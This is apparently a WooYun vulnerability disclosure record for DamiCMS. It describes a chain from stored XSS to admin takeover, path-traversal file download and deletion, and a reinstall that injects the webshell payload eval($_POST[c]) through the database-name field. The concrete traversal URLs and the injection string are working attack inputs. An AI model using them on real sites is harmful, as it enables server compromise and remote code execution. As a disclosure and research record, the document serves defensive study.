{"id": 49546, "wybug_id": "wooyun-2014-072816", "wybug_title": "大米cms多个漏洞组合写shell", "wybug_corp": "大米cms", "wybug_author": "JJ Fly", "wybug_date": "2014-08-19 15:45", "wybug_open_date": "2014-11-17 15:46", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 大米cms多个漏洞组合写shell 详细说明：  首先我们先来说下他的 xss。几乎没有过滤。(注册帐号，用户信息修改)我们先来注册个帐号。\n\n注册成功之后我们就不管了 。坐等管理员去后台查看会员信息。\n\n\n\n这样我们就可以登录管理员帐号了。再来任意文件下载 and 删除。\n\n先备份一下数据库 （数据库命名有规律，可被暴力破解。年月日_4位随机数_1.sql ）\n\n我们来查看下 下载以及删除文件的连接。?m=Backup&a=del&id=20140817_9550_1.sql?m=Backup&a=down&id=20140817_9550_1.sql然后去找了一下那两个函数\n//下载还原\tpublic function down()\t{\t\t$filepath = './Public/Backup/'.$_GET['id'];\t\tif (file_exists($filepath))\t\t{\t\t\t$filename = $filename ? $filename : basename($filepath);\t\t\t$filetype = trim(substr(strrchr($filename, '.'), 1));\t\t\t$filesize = filesize($filepath);\t\t\theader('Cache-control: max-age=31536000');\t\t\theader('Expires: '.gmdate('D, d M Y H:i:s', time() + 31536000).' GMT');\t\t\theader('Content-Encoding: none');\t\t\theader('Content-Length: '.$filesize);\t\t\theader('Content-Disposition: attachment; filename='.$filename);\t\t\theader('Content-Type: '.$filetype);\t\t\treadfile($filepath);\t\t\texit;\t\t}\t\telse\t\t{\t\t\t$this->error('出错了,没有找到分卷文件！');\t\t}\t}\t//删除分卷文件\tpublic function del()\t{\t\t$filename = trim($_GET['id']);\t\t@unlink('./Public/Backup/'.$filename);\t\t$this->assign(\"jumpUrl\",U(\"Backup/restore\"));\t\t$this->success($filename.'已经删除！');\t}\n两个函数都没有进行过滤 我们来下载一下  数据库的 配置文件 \nhttp://localhost/admin.php?m=Backup&a=down&id=../Config/config.ini.php\n查看到之后，我们把install.lck删除掉\nhttp://localhost/admin.php?m=Backup&a=del&id=../../install.lck\n然后会提示我们 install.lck已经删除 通过重新安装cms，可以进行写shell。\n//修改配置文件\t            $fp = fopen($source_file,\"r\");\t\t\t\t$configStr = fread($fp,filesize($source_file));\t\t\t\tfclose($fp);\t\t\t\t$configStr = str_replace('localhost',$dbhost,$configStr);\t\t\t\t$configStr = str_replace('damidb',$dbname,$configStr);\t\t\t\t$configStr = str_replace(\"'DB_USER'=>'admin'\",\"'DB_USER'=>'{$dbuser}'\",$configStr);\t\t\t\t$configStr = str_replace(\"'DB_PWD'=>'admin'\",\"'DB_PWD'=>'{$dbpwd}'\",$configStr);                if($dbport!='3306'){$configStr = str_replace(\"'DB_PORT'=>'3306'\",\"'DB_PORT'=>'{$dbport}'\",$configStr);}\t\t\t\t\t\t\t\t\t$fp = fopen($target_file,\"w\") or die(\"<script>alert('写入配置失败，请检查$target_file是否可写入！');history.go(-1);</script>\");\t\t\t\tfwrite($fp,$configStr);\t\t\t\tfclose($fp);\n$source_file为其cms保存的一个模版配置文件，\n\n数据库名damicms',1=>eval($_POST[c]),'xx'=>'   漏洞证明：  效果\\Public\\Config\\config.ini.php\n\n\n\n   修复方案：     版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-11-17 16:03 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  厉害    \n     2014-11-17 19:25 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  都进了后台了，拿shell还不好说啊    \n     2014-11-17 20:46 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n      这样我们就可以登录管理员帐号了。     碉堡了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}